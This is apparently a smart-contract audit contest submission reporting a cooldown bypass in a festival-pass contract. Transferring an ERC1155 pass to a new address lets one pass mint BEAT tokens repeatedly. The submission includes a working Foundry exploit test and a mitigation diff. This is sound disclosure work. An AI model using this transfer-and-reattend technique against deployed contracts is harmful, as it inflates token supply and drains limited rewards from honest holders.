## Beatland Festival
[https://codehawks.cyfrin.io/c/beatland-festival-clk83mi5b0004jp08axr82nq1/s/1]

100
EXP

Jan 17th, 2026 → Jan 17th, 2026

## Submission Details
Severity: **High**

## Cooldown Bypass via Pass Transfer Enables Unlimited BEAT Minting

firmanregar

## Root + Impact Description
The `attendPerformance` function enforces cooldown checks per address rather than per pass token. Since festival passes are transferable ERC1155 tokens, an attacker can bypass the cooldown by transferring their pass to a fresh address and immediately attending again.
```solidity
// FestivalPass.sol - attendPerformance()
require(block.timestamp >= lastCheckIn[msg.sender] + COOLDOWN, "Cooldown period not met");
```

## Risk
**Likelihood:**
* `hasAttended[performanceId][msg.sender]` only prevents the same address from attending twice
* `lastCheckIn[msg.sender]` only enforces cooldown for the same address
* Pass ownership check `(hasPass(msg.sender))` passes because the token was transferred

**Impact:**
* Unbounded BEAT inflation: A single pass can generate unlimited tokens within any 1-hour window
* Memorabilia drain: Excess BEAT enables disproportionate redemption of limited-supply memorabilia NFTs
* Economic dilution: Honest users' BEAT holdings and memorabilia access are permanently devalued
* No recovery mechanism: BEAT has no supply cap or burn offset; inflated supply is permanentImpact 2

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;
​
import "forge-std/Test.sol";
import "../src/FestivalPass.sol";
import "../src/BeatToken.sol";
​
contract CooldownBypassTest is Test {
    FestivalPass festival;
    BeatToken beat;
​
    address organizer = address(0xBEEF);
    address attackerA = address(0xA11CE);
    address attackerB = address(0xB0B);
​
    uint256 performanceId;
​
    function setUp() public {
        vm.deal(attackerA, 10 ether);
        vm.deal(attackerB, 10 ether);
​
        beat = new BeatToken();
        festival = new FestivalPass(address(beat), organizer);
        beat.setFestivalContract(address(festival));
​
        vm.startPrank(organizer);
        festival.configurePass(2, 1 ether, 100); // VIP pass
        uint256 start = block.timestamp + 10;
        performanceId = festival.createPerformance(start, 1 hours, 10e18);
        vm.stopPrank();
​
        vm.warp(start + 1);
    }
​
    function test_CooldownBypassViaTransfer() public {
        // Attacker A buys VIP pass
        vm.startPrank(attackerA);
        festival.buyPass{value: 1 ether}(2);
​
        // First attendance
        festival.attendPerformance(performanceId);
        uint256 balanceA = beat.balanceOf(attackerA);
        assertEq(balanceA, 20e18); // VIP multiplier: 2x
​
        // Transfer pass to attacker B
        festival.safeTransferFrom(attackerA, attackerB, 2, 1, "");
        vm.stopPrank();
​
        // Second attendance WITHIN SAME HOUR
        vm.startPrank(attackerB);
        festival.attendPerformance(performanceId);
        vm.stopPrank();
​
        uint256 balanceB = beat.balanceOf(attackerB);
        assertEq(balanceB, 20e18);
​
        // Total minted: 40 BEAT from one pass, one performance, same hour
        assertEq(beat.balanceOf(attackerA) + beat.balanceOf(attackerB), 40e18);
    }
}
```

The cooldown is tracked in `lastCheckIn[msg.sender]`, which maps addresses to timestamps. However, passes are ERC1155 tokens that can be freely transferred between addresses.

## Recommended Mitigation
Track cooldown per token ID rather than per address:
```diff
- mapping(address => uint256) public lastCheckIn;
+ mapping(uint256 => mapping(uint256 => uint256)) public lastPassCheckIn; // performanceId => passId => timestamp
​
function attendPerformance(uint256 performanceId) external {
    require(isPerformanceActive(performanceId), "Performance is not active");
    require(hasPass(msg.sender), "Must own a pass");
    require(!hasAttended[performanceId][msg.sender], "Already attended this performance");
    
+   uint256 passId = _getOwnedPassId(msg.sender);
+   require(
+       block.timestamp >= lastPassCheckIn[performanceId][passId] + COOLDOWN,
+       "Cooldown period not met"
+   );
    
    hasAttended[performanceId][msg.sender] = true;
-   lastCheckIn[msg.sender] = block.timestamp;
+   lastPassCheckIn[performanceId][passId] = block.timestamp;
    
    uint256 multiplier = getMultiplier(msg.sender);
    BeatToken(beatToken).mint(msg.sender, performances[performanceId].baseReward * multiplier);
    emit Attended(msg.sender, performanceId, performances[performanceId].baseReward * multiplier);
}
​
+ function _getOwnedPassId(address user) internal view returns (uint256) {
+     if (balanceOf(user, BACKSTAGE_PASS) > 0) return BACKSTAGE_PASS;
+     if (balanceOf(user, VIP_PASS) > 0) return VIP_PASS;
+     if (balanceOf(user, GENERAL_PASS) > 0) return GENERAL_PASS;
+     revert("No pass owned");
+ }
```


This ensures cooldown enforcement follows the token, not the holder.
